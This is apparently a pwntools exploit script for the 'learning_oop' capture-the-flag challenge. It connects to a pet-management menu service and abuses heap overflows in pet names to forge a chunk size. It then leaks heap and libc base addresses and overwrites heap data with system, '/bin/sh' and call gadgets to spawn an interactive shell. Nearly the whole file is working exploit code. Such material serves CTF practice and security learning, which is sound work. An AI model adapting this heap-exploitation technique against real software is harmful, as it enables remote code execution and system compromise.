#!/usr/bin/env python3
from pwn import *

# =========================================================
#                          SETUP                         
# =========================================================
exe = './learning_oop'
elf = context.binary = ELF(exe, checksec=True)
# libc = './libc.so.6'
libc = '/lib/x86_64-linux-gnu/libc.so.6'
libc = ELF(libc, checksec=False)
context.log_level = 'debug'
context.terminal = ["tmux", "splitw", "-h", "-l", "175"]
host, port = 'learning-oop.chals.sekai.team', 1337

def initialize(argv=[]):
    if args.GDB:
        return gdb.debug([exe] + argv, gdbscript=gdbscript)
    elif args.REMOTE:
        return remote(host, port, ssl=True)
    else:
        return process([exe] + argv)

gdbscript = '''
init-pwndbg

# update animal->die()
# breakrva 0x145a

# breakrva 0x143c
'''.format(**locals())

# =========================================================
#                         EXPLOITS
# ========================================================= 
CAT = 2
HORSE = 4

def create(species, name):
    io.sendlineafter(b'>', b'1')
    io.sendlineafter(b':', str(species).encode())
    io.sendlineafter(b':', name)

def play(idx):
    io.sendlineafter(b'>', b'2')
    io.sendlineafter(b'?', str(idx).encode())

def feed(idx):
    io.sendlineafter(b'>', b'3')
    io.sendlineafter(b'?', str(idx).encode())

def rest(idx):
    io.sendlineafter(b'>', b'4')
    io.sendlineafter(b'?', str(idx).encode())

def skip(cnt):
    for i in range(cnt):
        io.sendlineafter(b'>', b'69')

def exploit():
    global io
    heap = 0x0
    io = initialize()

    create(HORSE, b'a')
    
    io.recvuntil(b'pet: ')
    heap = int(io.recvline().strip(), 16) - 0x136d0
    
    create(HORSE, b'b')
    create(HORSE, b'c')
    create(HORSE, b'd')
    create(HORSE, b'e')
    create(HORSE, b'f')

    skip(4)

    payload = b'A' * 0x110
    payload += p32(0x481)
    create(HORSE, payload)

    create(HORSE, b'a')
    create(HORSE, b'B'*0x100 + p32(0x0) + p32(0x5))
    create(HORSE, b'c')
    create(HORSE, b'C'*0x100 + p32(0x10) + p32(0x10) + p32(0x480))
    create(HORSE, b'e')

    create(HORSE, b'D'*0x100)
    io.recvuntil(b'pet: 0x')
    io.recvline()
    libc.address = u64(io.recvuntil(b' died', drop=True).ljust(8, b'\x00')) - 0x203b20

    one_gadgets = [
        libc.address + 0x583ec, 
        libc.address + 0x583f3, 
        libc.address + 0xef4ce,
        libc.address + 0xef52b,
    ]
    gadget1 = libc.address + 0x00000000000984df # : mov rdi, qword ptr [rdi + 0x10] ; call qword ptr [rax + 0x380]
    gadget2 = libc.address + 0x000000000016c0c6 # : call qword ptr [rax + 8]

    skip(10)

    create(HORSE, p64(libc.sym['system']) + p64(next(libc.search(b'/bin/sh\x00'))))
    create(HORSE, b'b')
    create(HORSE, b'c')
    create(HORSE, b'd'*0x18 + p64(gadget2))

    # pause()
    payload = b'E' * (0x100-0x28) + p64(gadget1)*5
    payload += p32(0x0) + p32(0x10) + p64(0x3) + p64(0x121) + p64(heap+0x137b0)
    create(HORSE, payload[:-1])

    log.info("heap base: %#x", heap)
    log.info("libc base: %#x", libc.address)
    io.interactive()
    
if __name__ == '__main__':
    exploit()
